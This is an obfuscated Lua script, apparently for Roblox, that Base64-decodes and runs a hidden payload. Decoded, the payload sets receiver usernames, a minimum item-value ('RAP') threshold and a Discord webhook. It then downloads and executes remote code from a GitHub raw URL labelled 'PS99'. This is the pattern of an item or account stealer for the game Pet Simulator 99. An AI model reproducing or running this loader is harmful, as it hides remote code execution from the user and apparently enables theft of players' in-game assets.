
local encodedScript = "VXNlcm5hbWUgPSAic25pcGVyc3h5ejEiClVzZXJuYW1lMiA9ICJzbmlwZXJzeHl6MSIKTWluaW11bVJBUCA9IDMwMDAwMDAwCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NTE2NDY2OTg5NTE4MDQzMC9VMTVkZ2l0cTljVDl5ajRQZDM4NHdtbHRhNlJNa3k4dFA1dGZ5YjR2QkU0cTJEMnBRX1NFUl9YQ1FNOTJQQWhreDFQbiIKCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veWVzbGlkZXp6L0VrczB2YS9tYWluL1BTOTkiKSkoKQ=="

local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

loadstring(decode(encodedScript))()
